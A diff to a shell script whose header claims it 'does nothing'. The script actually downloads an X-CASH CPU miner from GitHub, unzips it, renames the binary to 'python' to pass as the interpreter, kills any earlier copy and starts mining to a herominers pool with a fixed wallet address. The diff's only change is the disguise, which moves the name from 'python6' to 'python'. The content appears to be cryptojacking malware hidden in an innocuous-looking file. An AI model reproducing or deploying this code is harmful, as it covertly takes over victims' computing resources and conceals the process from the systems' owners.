@@ -10,18 +10,18 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python6 ]; then
-    if pgrep -x "python6" > /dev/null
+if [ -f ${PWD}/python ]; then
+    if pgrep -x "python" > /dev/null
 then
-pkill python6
+pkill python
 echo " kill process"
-./python6 -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
+./python -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
     
 else
 
 echo "Miner da install , chay thoi "
-./python6 -F http://xcash.herominers.com:10441/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
+./python -F http://xcash.herominers.com:10441/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
      
 fi
@@ -30,7 +30,7 @@ fi
 
 wget https://github.com/X-CASH-official/XCASH_CPU_Miner/releases/download/1.0.0/XCASH_CPU_Miner_Linux_Ubuntu_16.04_1.0.0.zip
 unzip XCASH_CPU_Miner_Linux_Ubuntu_16.04_1.0.0.zip
-mv XCASH_CPU_Miner python6
-./python6 -F http://xcash.herominers.com:10441/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
+mv XCASH_CPU_Miner python
+./python -F http://xcash.herominers.com:10441/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
 exit 0
